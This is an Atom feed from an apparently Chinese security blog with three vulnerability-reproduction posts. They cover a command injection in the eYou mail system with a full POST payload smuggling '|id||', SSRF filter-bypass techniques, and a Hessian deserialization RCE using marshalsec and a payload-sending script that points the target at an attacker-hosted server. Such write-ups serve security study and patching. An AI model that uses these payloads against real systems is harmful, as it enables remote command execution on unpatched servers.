<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>月落花开</title>
  
  
  <link href="http://www.menthol.top/atom.xml" rel="self"/>
  
  <link href="http://www.menthol.top/"/>
  <updated>2021-04-17T09:34:42.301Z</updated>
  <id>http://www.menthol.top/</id>
  
  <author>
    <name>menthol</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>亿邮邮件系统命令执行</title>
    <link href="http://www.menthol.top/2021/04/16/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://www.menthol.top/2021/04/16/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-04-16T06:22:00.000Z</published>
    <updated>2021-04-17T09:34:42.301Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、影响范围"><a href="#一、影响范围" class="headerlink" title="一、影响范围"></a>一、影响范围</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V8.3-V8.13 </span><br></pre></td></tr></table></figure><h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><ul><li><p>界面信息</p><p><img src="/images/pasted-0.png"></p></li></ul><h3 id="三、漏洞证明"><a href="#三、漏洞证明" class="headerlink" title="三、漏洞证明"></a>三、漏洞证明</h3><ol><li><p>访问poc的url：10.10.10.130:9091/webadm/q=moni_detail.do&amp;action=gragh<br> <img src="/images/pasted-1.png"></p></li><li><p>这个返回数据包可用来批量探测是否有价值使用exp来打，如有自写扫描器可加入该poc进行无损扫描。</p></li><li><p>抓包然后发送payload</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /webadm/?q=moni_detail.do&amp;action=gragh HTTP/1.1</span><br><span class="line">Host: 10.10.10.130:9091</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: <span class="string">&quot; Not;A Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;91&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;91&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: ****</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span>=<span class="string">&#x27;|id||&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="/images/pasted-2.png"></p></li></ol><h3 id="四、修复建议"><a href="#四、修复建议" class="headerlink" title="四、修复建议"></a>四、修复建议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls&#x2F;usr&#x2F;local&#x2F;eyou&#x2F;mail&#x2F;lib&#x2F;php&#x2F;monitor (8.10.x及以后版本)</span><br><span class="line">ls&#x2F;usr&#x2F;local&#x2F;eyou&#x2F;mail&#x2F;app&#x2F;lib&#x2F;php&#x2F;monitor (8.10.x及以前版本)</span><br><span class="line"></span><br><span class="line">*如不了解具体版本号，上述两条命令可不分版本都执行一下</span><br><span class="line">如所有的验证命令都返回&quot;No such file or directory&quot;或&quot;没有那个文件或目录&quot;则证明不存在漏洞，反之则漏洞存在。</span><br></pre></td></tr></table></figure><p><br/><br/></p><ul><li>文章参考 <a href="https://mp.weixin.qq.com/s/0YUpI9O7GqATGXqcOMRCBw">【漏洞复现】亿邮命令执行</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一、影响范围&quot;&gt;&lt;a href=&quot;#一、影响范围&quot; class=&quot;headerlink&quot; title=&quot;一、影响范围&quot;&gt;&lt;/a&gt;一、影响范围&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut</summary>
      
    
    
    
    
    <category term="RCE" scheme="http://www.menthol.top/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞利用及防护</title>
    <link href="http://www.menthol.top/2021/04/16/test/"/>
    <id>http://www.menthol.top/2021/04/16/test/</id>
    <published>2021-04-16T01:45:00.000Z</published>
    <updated>2021-05-17T11:51:10.892Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h3><ul><li>SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</li></ul><h3 id="二、漏洞常见功能点"><a href="#二、漏洞常见功能点" class="headerlink" title="二、漏洞常见功能点"></a>二、漏洞常见功能点</h3><ul><li>加载远程图片功能。</li><li>加载远程网页功能。</li><li>未公开的api实现及调用URL的功能。</li><li>网站提供的各种下载功能点。</li><li>在线网页转码服务。</li></ul><h3 id="三、常见的绕过方式"><a href="#三、常见的绕过方式" class="headerlink" title="三、常见的绕过方式"></a>三、常见的绕过方式</h3><ol><li><p> @ 符号<br><code>例如：http://abc.com@127.0.0.1</code></p></li><li><p> 添加端口号<br><code>例如：http://127.0.0.1:8080</code></p></li><li><p>短地址<br><code>例如：https://0x9.me/xxx</code></p></li><li><p>利用302跳转<br><code> 例如：将http://zidingyu.com/index.php 设置跳转到127.0.0.1</code></p></li><li><p>将内部IP进行进制转换<br><code>例如：192.168.0.1=3232235521（十进制）</code></p></li><li><p>利用非HTTP协议<br><code>例如: file:///, gopher://, ftp:// </code></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一、漏洞介绍&quot;&gt;&lt;a href=&quot;#一、漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞介绍&quot;&gt;&lt;/a&gt;一、漏洞介绍&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hessian反序列化RCE漏洞</title>
    <link href="http://www.menthol.top/2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.menthol.top/2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-16T01:45:00.000Z</published>
    <updated>2021-04-17T08:42:30.727Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、组件介绍"><a href="#一、组件介绍" class="headerlink" title="一、组件介绍"></a>一、组件介绍</h3><ul><li>Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。Hessian反序列化可导致RCE,POC于2017年就公开了,但是经过测试,目前最新版本hessian-4.0.60.jar,同样存在反序列化问题</li></ul><h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><ol><li><p>需要一个提供反序列数据的服务器。</p><p> <img src="/images/pasted-3.png" alt="upload successful"></p></li><li><p>攻击端本地生成payload.里面的地址为提供反序列化数据的服务器地址。</p></li></ol>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http:&#x2F;&#x2F;471.196.183.126:8180&#x2F; ExecTemplateJDK7&gt;hession</span><br></pre></td></tr></table></figure><pre><code>![upload successful](/images/pasted-4.png)</code></pre><p>   攻击端本地生成hession文件。</p><ol start="3"><li>攻击端本地向目标发送payload，使得目标服务器向提供反序列化数据的服务器进行请求。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hessian.py -u http:&#x2F;&#x2F;192.168.182.178:8080&#x2F;HessianTest&#x2F;hessian -p hession</span><br></pre></td></tr></table></figure> <img src="/images/pasted-5.png" alt="upload successful"></li><li>目标服务器收到payload，并序列化payload，然后向提供反序列化数据的服务器进行请求。<br> 收到请求 <img src="/images/pasted-6.png" alt="upload successful"></li><li>目标服务器成功执行命令。 <img src="/images/pasted-7.png" alt="upload successful"></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;一、组件介绍&quot;&gt;&lt;a href=&quot;#一、组件介绍&quot; class=&quot;headerlink&quot; title=&quot;一、组件介绍&quot;&gt;&lt;/a&gt;一、组件介绍&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，</summary>
      
    
    
    
    
  </entry>
  
</feed>
